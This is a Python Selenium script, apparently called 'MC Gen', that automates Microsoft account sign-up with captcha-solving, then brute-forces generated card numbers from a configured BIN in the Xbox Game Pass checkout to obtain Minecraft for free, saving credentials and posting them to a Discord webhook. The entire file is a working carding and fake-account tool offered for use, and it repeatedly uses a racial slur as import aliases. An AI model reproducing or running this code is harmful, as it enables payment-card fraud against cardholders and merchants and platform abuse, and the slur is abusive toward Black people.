import sys, os, time, json, random, string, requests, os, zipfile
from colorama import init
from hashlib import sha256
from termcolor import cprint
from pyfiglet import figlet_format
from urllib.request import urlopen
from subprocess import check_output
from luhn_validator import validate
from discord_webhook import DiscordWebhook
import seleniumwebdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.select import Select
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys







def main():
    init(strip=not sys.stdout.isatty())
    cprint(figlet_format('MC Gen'), 'cyan')
    gen(json.load(open('config.json')))
    print('[!] Loading configuration.')
       


def gen(config):
    init(strip=not sys.stdout.isatty())
    userprefix = config['userprefix']
    country = config['country']
    gplink = config['gplink']
    postalcode = config['carding']['postalcode']
    webhook = config['webhook']
    browser = config['browser']
    nopecha = config['nopecha']


    email = random_string(10, string.ascii_lowercase) + '@outlook.com'
    password = random_string(8, string.ascii_letters)



    if browser == "chrome":
            
        from webdriver_manager.chrome import ChromeDriverManager as NiggerManager
        from selenium.webdriver import Chrome as BrowserDriverNigger
        from selenium.webdriver.chrome.options import Options as NiggerOptions
        
        options = NiggerOptions()
        options.add_argument("--enable-extensions")

        with open("ext.zip", 'wb') as f:
            f.write(requests.get('https://github.com/NopeCHA/NopeCHA/releases/download/0.3.1/chrome.zip').content)

        with zipfile.ZipFile("ext.zip", 'r') as zip_ref:
            zip_ref.extractall("nopecha_extension")

        options.add_argument(f'--load-extension={os.path.realpath(os.path.dirname(__file__))}/nopecha_extension')

        webdriver = BrowserDriverNigger(options=options, service=Service(NiggerManager().install()))
        wait = WebDriverWait(webdriver, 120)
    elif browser == "firefox":
        from webdriver_manager.firefox import GeckoDriverManager as NiggerManager
        from selenium.webdriver import Firefox as BrowserDriverNigger
        from selenium.webdriver.firefox.options import Options as NiggerOptions
        
        options = NiggerOptions()
        options.add_argument("--enable-extensions")
        
        
        webdriver = BrowserDriverNigger(options=options, service=Service(NiggerManager().install()))
        

        wait = WebDriverWait(webdriver, 120)
        webdriver.install_addon(f"{os.path.realpath(os.path.dirname(__file__))}/noptcha_0.3.0", temporary=True)

    if nopecha != "free":
        webdriver.set_window_size(800, 800)
        webdriver.get(f"https://nopecha.com/setup#{nopecha}")
    else:
        webdriver.set_window_size(800, 800)

    webdriver.get('https://signup.live.com/')

    print('[!] Starting sign up process.')

    wait.until(EC.visibility_of_element_located((By.ID, 'MemberName'))).send_keys(email)
    wait.until(EC.visibility_of_element_located((By.ID, 'iSignupAction'))).click()
    
    wait.until(EC.visibility_of_element_located((By.ID, 'PasswordInput'))).send_keys(password)
    wait.until(EC.visibility_of_element_located((By.ID, 'iOptinEmail'))).click()
    wait.until(EC.visibility_of_element_located((By.ID, 'iSignupAction'))).click()

    wait.until(EC.visibility_of_element_located((By.ID, 'FirstName'))).send_keys('a')
    wait.until(EC.visibility_of_element_located((By.ID, 'LastName'))).send_keys('a')
    wait.until(EC.visibility_of_element_located((By.ID, 'iSignupAction'))).click()

    wait.until(EC.visibility_of_element_located((By.ID, 'Country'))).send_keys(country)
    Select(webdriver.find_element(By.ID, 'BirthMonth')).select_by_value(str(random.randint(1, 12)))
    Select(webdriver.find_element(By.ID, 'BirthDay')).select_by_value(str(random.randint(1, 28)))
    wait.until(EC.visibility_of_element_located((By.ID, 'BirthYear'))).send_keys('1988')
    wait.until(EC.visibility_of_element_located((By.ID, 'iSignupAction'))).click()
    
    wait.until(EC.visibility_of_element_located((By.ID, 'home_children_button'))).click()
    
    print("[!] Waiting for manual captcha completion")
    

    print('[!] Redirecting to gamepass site.')

    webdriver.get(gplink)
    wait.until(EC.visibility_of_element_located((By.ID, 'mectrl_main_trigger'))).click()

    WebDriverWait(webdriver, 20000).until(EC.visibility_of_element_located((By.ID, 'Accept'))).click()

    print('[!] Xbox account creation completed.')

    wait.until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div[3]/div/div/div/div[2]/div[9]/div/div[2]/section/div[1]/div/div[2]/a'))).click()
    wait.until(EC.visibility_of_element_located((By.XPATH, '/html/body/reach-portal/div[3]/div/div/div/div/div/div/div/div/div/div/div[2]/div[4]/div/div[2]/button'))).click()

    print('[!] Starting carding process.')

    webdriver.switch_to.frame('purchase-sdk-hosted-iframe')
    wait.until(EC.visibility_of_element_located((By.XPATH, '/html/body/section/div/div/div/div/div/div[2]/div/div[2]/button[2]'))).click()
    wait.until(EC.visibility_of_element_located((By.ID, 'id_credit_card_visa_amex_mc'))).click()
    
    wait.until(EC.visibility_of_element_located((By.ID, 'address_line1'))).send_keys('a')
    wait.until(EC.visibility_of_element_located((By.ID, 'city'))).send_keys('a') 
    wait.until(EC.visibility_of_element_located((By.ID, 'postal_code'))).send_keys(postalcode)
    
    if webdriver.find_elements(By.ID, 'input_region'):
        webdriver.find_element(By.ID, 'input_region').send_keys('أبو ظبي')

    card(webdriver, config)
    
    webdriver.switch_to.default_content()

    wait.until(EC.visibility_of_element_located((By.XPATH, '/html/body/reach-portal/div[3]/div/div/div/div/div/div/div/div/div/div/div[2]/a')))
    
    with open('alts.txt', "a") as f:
        f.write(email + ':' + password + '\n')
        
    if webhook:
        DiscordWebhook(url=webhook, content=email + ':' + password).execute()
    
    print('[!] Redirecting to Minecraft to redeem game.')

    webdriver.get('https://www.minecraft.net/en-us/msaprofile/redeem?setupProfile=true')
    
    wait.until(EC.visibility_of_element_located((By.XPATH, '//*[@id="CoreAppsApp"]/div/div[2]/div/div/div/div[1]/div[1]/div/a'))).click()

    username = userprefix
    for i in range(6):
        username += str(random.randint(0, 9))

    wait.until(EC.visibility_of_element_located((By.XPATH, '//*[@id="profileNameLabel"]/input'))).send_keys(username)
    
    wait.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="main-content"]/section/div/div/div[2]/div[2]/form/div/div[2]/button'))).click()
    
    print('[!] Shutting down in 5 seconds.')
    
    time.sleep(5)
    
def card(webdriver, config):
    carding = config['carding']
    bin = carding['bin']
    cvv = carding['cvv']
    expiry = carding['expiry']
    month = expiry['month']
    year = expiry['year']
    
    wait = WebDriverWait(webdriver, 60)

    number = gen_cc(bin)
    while not validate(number): 
        number = gen_cc(bin)
    print('Trying card: ' + number + '|' + month + '|20' + year + '|' + cvv)
    
    wait.until(EC.visibility_of_element_located((By.ID, 'accountToken'))).send_keys(number)
    wait.until(EC.visibility_of_element_located((By.ID, 'accountHolderName'))).send_keys('a')
    wait.until(EC.visibility_of_element_located((By.ID, 'input_expiryMonth'))).send_keys(month)
    wait.until(EC.visibility_of_element_located((By.ID, 'input_expiryYear'))).send_keys(year)
    wait.until(EC.visibility_of_element_located((By.ID, 'cvvToken'))).send_keys(cvv)

    wait.until(EC.visibility_of_element_located((By.ID, 'pidlddc-button-saveButton'))).click()

    element = wait.until(EC.visibility_of_element_located((By.XPATH, '//*[@id="store-cart-root"]/div/div/div[2]/div/div[2]/button[2]|//*[@id="pidlddc-error-accountToken"]|//*[@id="pidlddc-error-cvvToken"]')))
    
    if not element.get_attribute('id'):
        element.click()
    else:
        wait.until(EC.visibility_of_element_located((By.ID, 'accountToken'))).clear()
        wait.until(EC.visibility_of_element_located((By.ID, 'accountHolderName'))).clear()
        wait.until(EC.visibility_of_element_located((By.ID, 'cvvToken'))).clear()
        card(webdriver, config)

def gen_cc(bin):
    number = bin
    while('x' in number):
        number = number.replace('x', str(random.randint(0, 9)), 1)
    if not validate(number):
        return gen_cc(bin)
    return number

def random_string(length, character_set):
    return ''.join(random.choice(character_set) for i in range(length))

def get_hwid():
    hwid = str(check_output(
    'wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
    
    return sha256(hwid.encode('utf-8')).hexdigest()

def clickElementWithJs(webdriver, xpath):
    str = """
        function getElementByXpath(path) {
            return document.evaluate(path, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
        }
    """ + f"let element = getElementByXpath('{xpath}'); element.click();"
    webdriver.execute_script(str)

if __name__ == "__main__":
    main()